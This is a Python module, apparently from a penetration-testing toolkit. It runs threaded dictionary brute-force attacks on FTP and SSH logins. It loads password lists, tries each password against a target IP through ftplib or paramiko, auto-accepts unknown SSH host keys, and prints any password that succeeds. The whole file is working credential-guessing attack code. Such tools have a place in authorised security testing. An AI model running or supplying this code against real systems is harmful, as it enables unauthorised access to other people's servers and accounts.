#!/usr/bin/env python
# -*- coding: utf-8 -*-

import paramiko         # external package
import ftplib           # external package
import threading
import queue
import socket
from ftplib import FTP
from common_utils import menu_utils
from common_utils import file_utils
import config_params
from os import listdir
from os.path import isfile, join
import time

""" This module uses dictionaries to perform brute force attacks """


def load_dictionaries_list():
    """loading the list of credentials dictionaries"""
    dictionaries_list = [f for f in listdir(config_params.CREDENTIALS_DICTIONARIES_FOLDER)
                    if (isfile(join(config_params.CREDENTIALS_DICTIONARIES_FOLDER, f)) and f.lower().endswith('.dic'))]
    return dictionaries_list


def _ftp_connection_attempt(ip, port, user, passw, my_queue):

    try:
        ftp = FTP(ip, timeout=config_params.FTP_SERVER_TIMEOUT)
        ftp.login(user, passw)
        my_queue.put(passw)
    except ftplib.error_perm:
        return
    except OSError as e:
        menu_utils.error(e)


def _ssh_connection_attempt(ip, port, user, passw, my_queue):

    conn_ssh = paramiko.SSHClient()
    conn_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        conn_ssh.connect(ip, port, user, passw)
        my_queue.put(passw)
    except paramiko.AuthenticationException:
        return
    except (socket.error, socket.timeout, paramiko.ssh_exception.SSHException) as e:
        menu_utils.error(e)


def dictionary_attack(protocol, ip, port, interval, user, dictionary):

    if (protocol.lower() != 'ftp') & (protocol.lower() != 'ssh'):
        menu_utils.warning('Only "FTP" or "SSH" protocols are supported')
        return

    menu_utils.header('Brute force attack, target IP: %s ' % ip)
    menu_utils.mixed_info("Protocol:", protocol)
    menu_utils.mixed_info("Interval between attempts:", "%s milliseconds" % interval)
    menu_utils.mixed_info("User:", user)
    menu_utils.mixed_info("Dictionary:", dictionary)

    counter = 0
    thread_list = []

    passwords = file_utils.load_file_as_list(dictionary)
    print("%s passwords in the dictionary" % len(passwords))
    menu_utils.highlighted_info("Progress:\n")

    my_queue = queue.Queue()

    if passwords:

        for passw in passwords:

            time.sleep(interval/1000)
            counter += 1
            additional_info = "Trying pass: %s" % passw
            menu_utils.progress_bar(int(100*counter/len(passwords)),
                                    config_params.PROGRESS_BAR_WIDTH, additional_info)

            if protocol.lower() == 'ftp':
                t = threading.Thread(target=_ftp_connection_attempt, args=(ip, port, user, passw, my_queue, ))
            elif protocol.lower() == 'ssh':
                t = threading.Thread(target=_ssh_connection_attempt, args=(ip, port, user, passw, my_queue,))

            t.start()
            thread_list.append(t)

            if counter % config_params.MAX_NUMBER_THREADS == 0:

                for thread in thread_list:
                    thread.join()                   # closing threads
                thread_list = []
                if not my_queue.empty():            # the pass is stored in the queue
                    break

        for thread in thread_list:
            thread.join()                           # closing threads

        if not my_queue.empty():                    # the pass is stored in the queue
            menu_utils.super_highlighted_info("\n[+] Password found: %s" % my_queue.get())
        else:
            menu_utils.warning("\n[-] Password not found in %s " % dictionary)

    else:
        menu_utils.warning("\n[-] %s dictionary not found " % dictionary)





